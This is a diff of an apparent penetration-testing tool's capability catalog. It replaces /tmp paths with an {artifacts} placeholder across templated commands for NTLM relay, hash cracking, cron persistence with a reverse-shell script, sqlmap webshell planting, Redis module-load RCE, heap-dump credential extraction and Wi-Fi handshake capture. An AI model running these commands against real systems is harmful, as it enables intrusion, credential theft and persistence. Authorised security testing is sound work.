-args = ['-r', '/tmp/krb.pcap', '-Y', 'kerberos', '-T', 'fields', '-e', 'kerberos.cname']
+args = ['-r', '{artifacts}/krb.pcap', '-Y', 'kerberos', '-T', 'fields', '-e', 'kerberos.cname']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Hostname Mine'
-args = ['-r', '/tmp/smb.pcap', '-Y', 'smb', '-T', 'fields', '-e', 'ip.src', '-e', 'nbns.name']
+args = ['-r', '{artifacts}/smb.pcap', '-Y', 'smb', '-T', 'fields', '-e', 'ip.src', '-e', 'nbns.name']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16657,14 +16657,14 @@ network = true
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Protocol Conversation Stats'
-args = ['-r', '/tmp/smb.pcap', '-q', '-z', 'conv,tcp']
+args = ['-r', '{artifacts}/smb.pcap', '-q', '-z', 'conv,tcp']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'HTTP Host Mine'
-args = ['-r', '/tmp/smb.pcap', '-Y', 'http.request', '-T', 'fields', '-e', 'http.host']
+args = ['-r', '{artifacts}/smb.pcap', '-Y', 'http.request', '-T', 'fields', '-e', 'http.host']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16678,14 +16678,14 @@ network = false
 binary = 'networkminer'
 [[capability.provider.operation]]
 name = 'PCAP Artifact Extract'
-args = ['-r', '/tmp/smb.pcap']
+args = ['-r', '{artifacts}/smb.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Top Talkers List'
-args = ['-r', '/tmp/smb.pcap', '-q', '-z', 'ip_hosts,tree']
+args = ['-r', '{artifacts}/smb.pcap', '-q', '-z', 'ip_hosts,tree']
 output = 'lines'
 network = false
 [[capability]]
@@ -16738,7 +16738,7 @@ network = true
 binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay Coerced Auth'
-args = ['-tf', '/tmp/relay_targets.txt', '-smb2support', '-socks']
+args = ['-tf', '{artifacts}/relay_targets.txt', '-smb2support', '-socks']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -16773,7 +16773,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Coerced Hash Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '{artifacts}/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16945,7 +16945,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Pivot Graph Build'
-args = ['pivot_map.py', '--cidr', '{cidr}', '--out', '/tmp/lateral_map.json']
+args = ['pivot_map.py', '--cidr', '{cidr}', '--out', '{artifacts}/lateral_map.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -16959,14 +16959,14 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Reachable Host Extract'
-args = ['-c', 'discovered', '/tmp/lateral_map.json']
+args = ['-c', 'discovered', '{artifacts}/lateral_map.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Map Artifact Verify'
-args = ['-la', '/tmp/lateral_map.json']
+args = ['-la', '{artifacts}/lateral_map.json']
 output = 'lines'
 network = false
 
@@ -17226,7 +17226,7 @@ phase = 'persistence'
 label = 'CRON PERSISTENCE'
 summary = 'Establish scheduled-task persistence via cron on Linux targets'
 inputs = [
-  { key = 'payload', type = 'file', required = false, default = '/tmp/rev.sh' },
+  { key = 'payload', type = 'file', required = false, default = '{artifacts}/rev.sh' },
   { key = 'name', type = 'text', required = false, default = 'tsupd' },
 ]
 [[capability.provider]]
@@ -17544,7 +17544,7 @@ network = true
 binary = 'ssh-keygen'
 [[capability.provider.operation]]
 name = 'Dedicated Key Generate'
-args = ['-t', 'ed25519', '-f', '/tmp/tsupd_key', '-N', '""', '-C', 'tsupd']
+args = ['-t', 'ed25519', '-f', '{artifacts}/tsupd_key', '-N', '""', '-C', 'tsupd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -18601,7 +18601,7 @@ network = false
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Client Connect Monitor'
-args = ['{iface}mon', '--write', '/tmp/rogue_capture']
+args = ['{iface}mon', '--write', '{artifacts}/rogue_capture']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18615,7 +18615,7 @@ network = false
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Rogue Traffic Capture'
-args = ['-i', '{iface}', '-w', '/tmp/rogue.pcap']
+args = ['-i', '{iface}', '-w', '{artifacts}/rogue.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -19019,7 +19019,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Verification Report Build'
-args = ['persistence_verify.py', '--name', '{name}', '--out', '/tmp/persist_report.json']
+args = ['persistence_verify.py', '--name', '{name}', '--out', '{artifacts}/persist_report.json']
 output = 'json'
 network = false
 
@@ -19260,7 +19260,7 @@ network = true
 binary = 'sqlmap'
 [[capability.provider.operation]]
 name = 'File Write Webshell'
-args = ['-u', '{url}', '--batch', '--file-write=/tmp/shell.php', '--file-dest=/var/www/html/shell.php']
+args = ['-u', '{url}', '--batch', '--file-write={artifacts}/shell.php', '--file-dest=/var/www/html/shell.php']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -19571,7 +19571,7 @@ label = 'FILE UPLOAD RCE'
 summary = 'Achieve code execution through unrestricted file upload paths'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'shell', type = 'file', required = false, default = '/tmp/shell.php' },
+  { key = 'shell', type = 'file', required = false, default = '{artifacts}/shell.php' },
   { key = 'lhost', type = 'target', required = true },
   { key = 'lport', type = 'port', required = false, default = '4444' },
 ]
@@ -20032,7 +20032,7 @@ output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Actuator Heap Dump'
-args = ['--max-time', '30', '-sk', '-o', '/tmp/heap.bin', '{url}/actuator/heapdump']
+args = ['--max-time', '30', '-sk', '-o', '{artifacts}/heap.bin', '{url}/actuator/heapdump']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
@@ -20065,7 +20065,7 @@ network = true
 binary = 'strings'
 [[capability.provider.operation]]
 name = 'Heap Creds Extract'
-args = ['/tmp/heap.bin']
+args = ['{artifacts}/heap.bin']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -20475,7 +20475,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Coerced NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '{artifacts}/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -20550,7 +20550,7 @@ network = true
 binary = 'redis-cli'
 [[capability.provider.operation]]
 name = 'Module Load RCE'
-args = ['-h', '{rhost}', 'module', 'load', '/tmp/exp.so']
+args = ['-h', '{rhost}', 'module', 'load', '{artifacts}/exp.so']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -21617,7 +21617,7 @@ network = true
 binary = 'gitleaks'
 [[capability.provider.operation]]
 name = 'GitLab Token Hunt'
-args = ['detect', '--source', '{url}/.git', '--report-format', 'json', '--report-path', '/tmp/gl.json']
+args = ['detect', '--source', '{url}/.git', '--report-format', 'json', '--report-path', '{artifacts}/gl.json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -21994,7 +21994,7 @@ network = true
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'GraphQL Introspection Probe'
-args = ['--max-time', '30', '-sk', '{url}/graphql', '-d', '{"query":"{__schema{types{name}}}"}']
+args = ['--max-time', '30', '-sk', '{url}/graphql', '-d', '{{"query":"{{__schema{{types{{name}}}}}}"}}']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -22119,7 +22119,7 @@ network = true
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Chain Report Build'
-args = ['chain_report.py', '--rhost', '{rhost}', '--out', '/tmp/chain.json']
+args = ['chain_report.py', '--rhost', '{rhost}', '--out', '{artifacts}/chain.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -22154,19 +22154,19 @@ network = true
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Exfil Artifact Verify'
-args = ['/tmp/chain.json']
+args = ['{artifacts}/chain.json']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Exfil Artifact Verify'
-args = ['/tmp/chain.json']
+args = ['{artifacts}/chain.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Proof Hash Snapshot'
-args = ['/tmp/chain.json']
+args = ['{artifacts}/chain.json']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22278,21 +22278,21 @@ network = false
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Iface State Artifact Verify'
-args = ['/tmp/iface_state.txt']
+args = ['{artifacts}/iface_state.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Iface Snapshot Hash'
-args = ['/tmp/iface_state.txt']
+args = ['{artifacts}/iface_state.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Interface Report Build'
-args = ['iface_report.py', '--iface', '{iface}', '--out', '/tmp/iface_report.json']
+args = ['iface_report.py', '--iface', '{iface}', '--out', '{artifacts}/iface_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -22307,62 +22307,62 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Band Scan 2G Capture'
-args = ['{iface}', '--band', 'abg', '-w', '/tmp/cap/full_band', '--write-interval', '5']
+args = ['{iface}', '--band', 'abg', '-w', '{artifacts}/cap/full_band', '--write-interval', '5']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Channel Hop OUI Collect'
-args = ['{iface}', '--write', '/tmp/cap/oui_scan', '--output-format', 'csv,kismet,netxml']
+args = ['{iface}', '--write', '{artifacts}/cap/oui_scan', '--output-format', 'csv,kismet,netxml']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Fixed Channel AP Focus'
-args = ['{iface}', '-c', '6', '--bssid', '{bssid}', '-w', '/tmp/cap/ch6_focus']
+args = ['{iface}', '-c', '6', '--bssid', '{bssid}', '-w', '{artifacts}/cap/ch6_focus']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Raw Beacon Dump'
-args = ['-i', '{iface}', '-nn', '-w', '/tmp/cap/beacons.pcap', '-c', '5000', 'type mgt subtype beacon']
+args = ['-i', '{iface}', '-nn', '-w', '{artifacts}/cap/beacons.pcap', '-c', '5000', 'type mgt subtype beacon']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Beacon Ssid Extract'
-args = ['-r', '/tmp/cap/beacons.pcap', '-T', 'fields', '-e', 'wlan.ssid', '-e', 'wlan.bssid', '-Y', 'wlan.fc.type_subtype==8']
+args = ['-r', '{artifacts}/cap/beacons.pcap', '-T', 'fields', '-e', 'wlan.ssid', '-e', 'wlan.bssid', '-Y', 'wlan.fc.type_subtype==8']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Client Assoc Extract'
-args = ['-r', '/tmp/cap/full_band-01.cap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da', '-Y', 'wlan.fc.type_subtype==0']
+args = ['-r', '{artifacts}/cap/full_band-01.cap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da', '-Y', 'wlan.fc.type_subtype==0']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Hidden Ssid Marker Hunt'
-args = ['-iE', '<length:\\s+0>|hidden', '/tmp/cap/oui_scan-01.csv']
+args = ['-iE', '<length:\\s+0>|hidden', '{artifacts}/cap/oui_scan-01.csv']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Wps Ap Filter'
-args = ['-E', 'WPS', '/tmp/cap/oui_scan-01.kismet.csv']
+args = ['-E', 'WPS', '{artifacts}/cap/oui_scan-01.kismet.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Ap Dedup Sort'
-args = ['-u', '/tmp/cap/aps.txt']
+args = ['-u', '{artifacts}/cap/aps.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Ap Count Tally'
-args = ['-l', '/tmp/cap/aps.txt']
+args = ['-l', '{artifacts}/cap/aps.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22376,42 +22376,42 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Kismet Csv Parse'
-args = ['kismet_parse.py', '--in', '/tmp/cap/oui_scan-01.kismet.csv', '--out', '/tmp/cap/aps.json']
+args = ['kismet_parse.py', '--in', '{artifacts}/cap/oui_scan-01.kismet.csv', '--out', '{artifacts}/cap/aps.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Capture Artifact Verify'
-args = ['/tmp/cap/full_band-01.cap']
+args = ['{artifacts}/cap/full_band-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Capture Hash Snapshot'
-args = ['/tmp/cap/full_band-01.cap']
+args = ['{artifacts}/cap/full_band-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Capture Report Build'
-args = ['capture_report.py', '--in', '/tmp/cap/aps.json', '--out', '/tmp/cap_report.json']
+args = ['capture_report.py', '--in', '{artifacts}/cap/aps.json', '--out', '{artifacts}/cap_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Capture Integrity Check'
-args = ['--check', '/tmp/cap/ch6_focus-01.cap']
+args = ['--check', '{artifacts}/cap/ch6_focus-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Airodump Csv Review'
-args = ['/tmp/cap/oui_scan-01.csv']
+args = ['{artifacts}/cap/oui_scan-01.csv']
 output = 'lines'
 network = false
 [[capability]]
@@ -22424,12 +22424,12 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Encryption Filter Scan'
-args = ['{iface}', '--encrypt', 'wpa,wpa2,wpa3', '--write', '/tmp/cap/enc_scan']
+args = ['{iface}', '--encrypt', 'wpa,wpa2,wpa3', '--write', '{artifacts}/cap/enc_scan']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Opn Ap Sweep'
-args = ['{iface}', '--encrypt', 'opn', '-w', '/tmp/cap/opn_scan']
+args = ['{iface}', '--encrypt', 'opn', '-w', '{artifacts}/cap/opn_scan']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22462,40 +22462,40 @@ network = false
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Rsn Cipher Extract'
-args = ['-r', '/tmp/cap/enc_scan-01.cap', '-T', 'fields', '-e', 'wlan.rsn.pcs', '-e', 'wlan.rsn.akms', '-Y', 'wlan.fc.type_subtype==8']
+args = ['-r', '{artifacts}/cap/enc_scan-01.cap', '-T', 'fields', '-e', 'wlan.rsn.pcs', '-e', 'wlan.rsn.akms', '-Y', 'wlan.fc.type_subtype==8']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Ssid List Extract'
-args = ['-oE', '[^,]+,', '/tmp/cap/enc_scan-01.csv']
+args = ['-oE', '[^,]+,', '{artifacts}/cap/enc_scan-01.csv']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Ie Wpa3 Sae Hunt'
-args = ['-iE', 'SAE|WPA3|RSN', '/tmp/cap/enc_scan-01.csv']
+args = ['-iE', 'SAE|WPA3|RSN', '{artifacts}/cap/enc_scan-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Ap Ssid Dedup'
-args = ['-u', '/tmp/cap/ssids.txt']
+args = ['-u', '{artifacts}/cap/ssids.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Discovered Ap Count'
-args = ['-l', '/tmp/cap/ssids.txt']
+args = ['-l', '{artifacts}/cap/ssids.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Ap Inventory Build'
-args = ['ap_inventory.py', '--in', '/tmp/cap/enc_scan-01.csv', '--out', '/tmp/ap_inventory.csv']
+args = ['ap_inventory.py', '--in', '{artifacts}/cap/enc_scan-01.csv', '--out', '{artifacts}/ap_inventory.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22516,21 +22516,21 @@ network = false
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Inventory Artifact Verify'
-args = ['/tmp/ap_inventory.csv']
+args = ['{artifacts}/ap_inventory.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Inventory Hash Snapshot'
-args = ['/tmp/ap_inventory.csv']
+args = ['{artifacts}/ap_inventory.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Ap Report Build'
-args = ['ap_report.py', '--in', '/tmp/ap_inventory.csv', '--out', '/tmp/ap_report.json']
+args = ['ap_report.py', '--in', '{artifacts}/ap_inventory.csv', '--out', '{artifacts}/ap_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -22545,7 +22545,7 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Targeted Handshake Listen'
-args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/hs/target_hs']
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '{artifacts}/hs/target_hs']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22569,89 +22569,89 @@ network = false
 binary = 'hcxdumptool'
 [[capability.provider.operation]]
 name = 'Hcx Targeted Dump'
-args = ['-i', '{iface}', '-w', '/tmp/hs/target.pcapng', '--rds=1']
+args = ['-i', '{iface}', '-w', '{artifacts}/hs/target.pcapng', '--rds=1']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Hcx Passive Band Dump'
-args = ['-i', '{iface}', '-w', '/tmp/hs/passive.pcapng', '--rds=1']
+args = ['-i', '{iface}', '-w', '{artifacts}/hs/passive.pcapng', '--rds=1']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Eapol Frame Filter'
-args = ['-r', '/tmp/hs/target_hs-01.cap', '-Y', 'eapol', '-T', 'fields', '-e', 'wlan.sa', '-e', 'eapol.type']
+args = ['-r', '{artifacts}/hs/target_hs-01.cap', '-Y', 'eapol', '-T', 'fields', '-e', 'wlan.sa', '-e', 'eapol.type']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'Convert To 22000 Hash'
-args = ['-o', '/tmp/hs/hash.22000', '/tmp/hs/target.pcapng']
+args = ['-o', '{artifacts}/hs/hash.22000', '{artifacts}/hs/target.pcapng']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Handshake Present Verify'
-args = ['-b', '{bssid}', '/tmp/hs/target_hs-01.cap']
+args = ['-b', '{bssid}', '{artifacts}/hs/target_hs-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Essid Confirm In Cap'
-args = ['-E', '{ssid}', '/tmp/hs/target_hs-01.cap']
+args = ['-E', '{ssid}', '{artifacts}/hs/target_hs-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Handshake File Verify'
-args = ['/tmp/hs/target_hs-01.cap', '/tmp/hs/hash.22000']
+args = ['{artifacts}/hs/target_hs-01.cap', '{artifacts}/hs/hash.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Hash Line Count'
-args = ['-l', '/tmp/hs/hash.22000']
+args = ['-l', '{artifacts}/hs/hash.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Handshake Hash Snapshot'
-args = ['/tmp/hs/target_hs-01.cap']
+args = ['{artifacts}/hs/target_hs-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Hcx Potfile Review'
-args = ['/tmp/hs/potfile.txt']
+args = ['{artifacts}/hs/potfile.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Handshake Report Build'
-args = ['hs_report.py', '--in', '/tmp/hs/', '--bssid', '{bssid}', '--out', '/tmp/hs_report.json']
+args = ['hs_report.py', '--in', '{artifacts}/hs/', '--bssid', '{bssid}', '--out', '{artifacts}/hs_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Hash Sanity Mode Check'
-args = ['-m', '22000', '-a', '0', '/tmp/hs/hash.22000', '--show']
+args = ['-m', '22000', '-a', '0', '{artifacts}/hs/hash.22000', '--show']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Hs File Dedup Sort'
-args = ['-u', '/tmp/hs/handshakes.txt']
+args = ['-u', '{artifacts}/hs/handshakes.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22671,41 +22671,41 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'hcxdumptool'
 [[capability.provider.operation]]
 name = 'Pmkid Target Dump'
-args = ['-i', '{iface}', '-w', '/tmp/pmkid/target.pcapng', '--rds=1']
+args = ['-i', '{iface}', '-w', '{artifacts}/pmkid/target.pcapng', '--rds=1']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Pmkid Broadcast Sweep'
-args = ['-i', '{iface}', '-w', '/tmp/pmkid/sweep.pcapng', '--rds=1']
+args = ['-i', '{iface}', '-w', '{artifacts}/pmkid/sweep.pcapng', '--rds=1']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'Extract 22000 Pmkid'
-args = ['-o', '/tmp/pmkid.22000', '/tmp/pmkid/target.pcapng']
+args = ['-o', '{artifacts}/pmkid.22000', '{artifacts}/pmkid/target.pcapng']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Extract 16800 Legacy'
-args = ['-o', '/tmp/pmkid.16800', '--pmkid', '/tmp/pmkid/target.pcapng']
+args = ['-o', '{artifacts}/pmkid.16800', '--pmkid', '{artifacts}/pmkid/target.pcapng']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Straight Dict Crack 22000'
-args = ['-m', '22000', '-a', '0', '/tmp/pmkid.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{artifacts}/pmkid.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Rule Based Crack 22000'
-args = ['-m', '22000', '-a', '0', '/tmp/pmkid.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/best66.rule}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{artifacts}/pmkid.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/best66.rule}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Mask Attack 22000'
-args = ['-m', '22000', '-a', '3', '/tmp/pmkid.22000', '?u?l?l?l?l?d?d?d?d', '--potfile-disable']
+args = ['-m', '22000', '-a', '3', '{artifacts}/pmkid.22000', '?u?l?l?l?l?d?d?d?d', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22719,63 +22719,63 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Target Bssid Match Hunt'
-args = ['-E', '{bssid}', '/tmp/pmkid.22000']
+args = ['-E', '{bssid}', '{artifacts}/pmkid.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Pmkid Entry Count'
-args = ['-l', '/tmp/pmkid.22000']
+args = ['-l', '{artifacts}/pmkid.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Pmkid Artifact Verify'
-args = ['/tmp/pmkid.22000']
+args = ['{artifacts}/pmkid.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Pmkid Hash Snapshot'
-args = ['/tmp/pmkid.22000']
+args = ['{artifacts}/pmkid.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Pmkid Dedup Sort'
-args = ['-u', '/tmp/pmkid.22000']
+args = ['-u', '{artifacts}/pmkid.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Pmkid Parse To Json'
-args = ['pmkid_parse.py', '--in', '/tmp/pmkid.22000', '--out', '/tmp/pmkid.json']
+args = ['pmkid_parse.py', '--in', '{artifacts}/pmkid.22000', '--out', '{artifacts}/pmkid.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Show Cracked Only'
-args = ['-m', '22000', '/tmp/pmkid.22000', '--show', '--potfile-disable', '-o', '/tmp/pmkid_cracked.txt']
+args = ['-m', '22000', '{artifacts}/pmkid.22000', '--show', '--potfile-disable', '-o', '{artifacts}/pmkid_cracked.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Pmkid Report Build'
-args = ['pmkid_report.py', '--in', '/tmp/pmkid.json', '--out', '/tmp/pmkid_report.json']
+args = ['pmkid_report.py', '--in', '{artifacts}/pmkid.json', '--out', '{artifacts}/pmkid_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'Ap Info Table Dump'
-args = ['-X', '/tmp/pmkid/ap_info.txt', '/tmp/pmkid/sweep.pcapng']
+args = ['-X', '{artifacts}/pmkid/ap_info.txt', '{artifacts}/pmkid/sweep.pcapng']
 output = 'lines'
 network = false
 [[capability]]
@@ -22814,19 +22814,19 @@ network = false
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Client Drop Watch'
-args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/deauth/watch']
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '{artifacts}/deauth/watch']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Deauth Frame Count'
-args = ['-r', '/tmp/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==12', '-T', 'fields', '-e', 'wlan.sa']
+args = ['-r', '{artifacts}/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==12', '-T', 'fields', '-e', 'wlan.sa']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Disassoc Frame Count'
-args = ['-r', '/tmp/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==10', '-T', 'fields', '-e', 'wlan.da']
+args = ['-r', '{artifacts}/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==10', '-T', 'fields', '-e', 'wlan.da']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22847,28 +22847,28 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Deauth Source Extract'
-args = ['-oE', '[0-9a-f:]{17}', '/tmp/deauth/watch-01.csv']
+args = ['-oE', '[0-9a-f:]{{17}}', '{artifacts}/deauth/watch-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Deauth Count Tally'
-args = ['-l', '/tmp/deauth/frames.txt']
+args = ['-l', '{artifacts}/deauth/frames.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Deauth Cap Verify'
-args = ['/tmp/deauth/watch-01.cap']
+args = ['{artifacts}/deauth/watch-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
